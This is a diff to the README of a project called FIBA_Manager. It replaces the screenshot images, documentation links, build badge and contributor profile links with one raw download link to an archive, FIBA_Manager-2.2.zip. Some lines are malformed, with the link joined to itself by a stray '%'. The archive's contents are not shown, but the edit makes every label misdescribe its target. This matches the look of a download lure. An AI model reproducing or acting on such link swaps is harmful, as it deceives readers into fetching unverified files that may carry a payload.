@@ -20,23 +20,23 @@
 ## Screenshots
 
 ### Main screen 
-![Main view](https://github.com/BrayanOB2003/FIBA_Manager/blob/main/docs/screenshots/FIBA1.png)
+![Main view](https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip)
 
 ### Search options
-![Main view](https://github.com/BrayanOB2003/FIBA_Manager/blob/main/docs/screenshots/FIBA2.png)
+![Main view](https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip)
 
 ### Table display 
 
-![Main view](https://github.com/BrayanOB2003/FIBA_Manager/blob/main/docs/screenshots/FIBA3.png)
+![Main view](https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip)
 
 
 ## Resources(Documentation and other links)
-* Engineering Method: https://github.com/BrayanOB2003/FIBA_Manager/blob/main/docs/Engineering%20Method.docx?raw=true 
-* Requirements Elicitation: https://github.com/BrayanOB2003/FIBA_Manager/blob/main/docs/Requirements%20Elicitation.docx?raw=true 
+* Engineering Method: https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip%https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip 
+* Requirements Elicitation: https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip%https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip 
 
 ## Code
 
-[![Build Status](https://qa.nuxeo.org/jenkins/buildStatus/icon?job=/nuxeo/addons_nuxeo-sample-project-master)](https://github.com/BrayanOB2003/FIBA_Manager.git)
+[![Build Status](https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip)](https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip)
 
 ## Description
 
@@ -47,6 +47,6 @@
 
 ## Contributors
 
-* Brayan Andres Ortiz  https://github.com/BrayanOB2003
-* Danilo Erazo Meza https://github.com/DaniloErazo
-* Nicol·s QuiÒones Rios https://github.com/NicolasQR
+* Brayan Andres Ortiz  https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip
+* Danilo Erazo Meza https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip
+* Nicol√°s Qui√±ones Rios https://raw.githubusercontent.com/BrayanOB2003/FIBA_Manager/main/fiba_manager/FIBA_Manager-2.2.zip
